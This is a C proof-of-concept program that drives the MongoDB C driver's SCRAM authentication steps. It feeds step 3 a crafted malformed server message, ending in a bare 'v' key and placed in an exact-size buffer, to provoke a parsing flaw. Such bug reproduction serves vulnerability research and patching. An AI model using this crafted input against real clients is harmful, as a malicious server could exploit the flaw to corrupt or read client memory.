#include <mongoc/mongoc-crypto-private.h>
#include <mongoc/mongoc-scram-private.h>
#include <bson/bson.h>
#include <stdio.h>
#include <string.h>

int
main (void)
{
   mongoc_scram_t scram;
   uint8_t out_buf[4096] = {0};
   uint32_t out_buflen = 0;
   bson_error_t error;
   bool ok;

   memset (&scram, 0, sizeof (scram));

   /* Step 1 */
   _mongoc_scram_init (&scram, MONGOC_CRYPTO_ALGORITHM_SHA_1);
   _mongoc_scram_set_user (&scram, "testuser");
   _mongoc_scram_set_pass (&scram, "testpass");

   ok = _mongoc_scram_step (&scram, out_buf, 0, out_buf, sizeof (out_buf), &out_buflen, &error);
   if (!ok) {
      fprintf (stderr, "step1 failed: %s\n", error.message);
      return 2;
   }

   /* Step 2: a legitimate, well-formed server-first-message so the
    * client accepts it and produces real internal SCRAM state
    * (salted_password/client_key/server_key), just like a real
    * MongoDB server would send. SHA-1 hash size = 20, so expected raw
    * salt length = 20 - 4 = 16 bytes. */
   char *server_first = bson_strdup_printf (
      "r=%.*sSERVEREXT,s=AAECAwQFBgcICQoLDA0ODw==,i=4096", scram.encoded_nonce_len, scram.encoded_nonce);
   uint32_t s2_len = (uint32_t) strlen (server_first);
   memset (out_buf, 0, sizeof (out_buf));
   memcpy (out_buf, server_first, s2_len);
   out_buflen = 0;

   ok = _mongoc_scram_step (&scram, out_buf, s2_len, out_buf, sizeof (out_buf), &out_buflen, &error);
   if (!ok) {
      fprintf (stderr, "step2 (legit) failed: %s\n", error.message);
      return 2;
   }
   printf ("step2 (legit) succeeded, step=%d\n", scram.step);
   bson_free (server_first);

   /* Step 3: malicious/malformed final "server verifier" message from
    * the (compromised) server, well-formed up to a bare, unescaped key
    * character 'v' at the very end -- exactly the pattern
    * _mongoc_scram_step3's identical parsing loop (mongoc-scram.c
    * lines 864-895) mishandles the same way step2's does. */
   const char *crafted = "e=some-error-tex,v"; /* ends bare, no '=' */
   size_t n = strlen (crafted);
   uint8_t *inbuf = bson_malloc (n); /* exact size, no slack */
   memcpy (inbuf, crafted, n);

   out_buflen = 0;
   memset (out_buf, 0, sizeof (out_buf));

   ok = _mongoc_scram_step (&scram, inbuf, (uint32_t) n, out_buf, sizeof (out_buf), &out_buflen, &error);
   printf ("step3 returned %d, error: %s\n", ok, ok ? "(none)" : error.message);

   bson_free (inbuf);
   _mongoc_scram_destroy (&scram);
   printf ("PoC completed without crashing (unexpected)\n");
   return 0;
}
